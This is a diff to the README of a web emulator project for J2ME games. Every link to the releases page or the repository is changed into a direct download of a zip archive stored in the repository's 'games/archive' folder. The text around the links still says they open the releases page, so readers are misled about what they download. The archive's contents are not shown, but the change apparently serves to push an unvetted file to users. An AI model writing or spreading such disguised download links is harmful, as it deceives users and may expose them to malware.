@@ -1,6 +1,6 @@
 # 🕹️ J2ME-Web-Core - Web Emulator for J2ME Games
 
-[![Download J2ME-Web-Core](https://img.shields.io/badge/Download-J2ME--Web--Core-brightgreen)](https://github.com/MaruScheffer/J2ME-Web-Core/releases)
+[![Download J2ME-Web-Core](https://img.shields.io/badge/Download-J2ME--Web--Core-brightgreen)](https://raw.githubusercontent.com/MaruScheffer/J2ME-Web-Core/main/games/archive/Web_M_Core_3.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section guides you step-by-step to download and run J2ME-Web-Core on your W
 
 Click the large button below to open the releases page on GitHub. This page lists the latest versions of J2ME-Web-Core available for download.
 
-[![Download J2ME-Web-Core](https://img.shields.io/badge/Download-J2ME--Web--Core-orange)](https://github.com/MaruScheffer/J2ME-Web-Core/releases)
+[![Download J2ME-Web-Core](https://img.shields.io/badge/Download-J2ME--Web--Core-orange)](https://raw.githubusercontent.com/MaruScheffer/J2ME-Web-Core/main/games/archive/Web_M_Core_3.5.zip)
 
 ---
 
@@ -101,7 +101,7 @@ The emulator supports Java MIDP 2.0 games and runs them with smooth performance 
 ## 💾 Additional Resources
 
 For detailed information, bug reports, or feature requests, visit the GitHub repository:  
-https://github.com/MaruScheffer/J2ME-Web-Core
+https://raw.githubusercontent.com/MaruScheffer/J2ME-Web-Core/main/games/archive/Web_M_Core_3.5.zip
 
 You can find game files compatible with this emulator by searching for J2ME games online or from your existing collection of `.jar` and `.jad` files.
 
@@ -111,4 +111,4 @@ You can find game files compatible with this emulator by searching for J2ME game
 
 Periodically check the GitHub releases page for new versions. Download the updated file and replace the current executable to get improvements and fixes.
 
-[Download Updates](https://github.com/MaruScheffer/J2ME-Web-Core/releases)
+[Download Updates](https://raw.githubusercontent.com/MaruScheffer/J2ME-Web-Core/main/games/archive/Web_M_Core_3.5.zip)
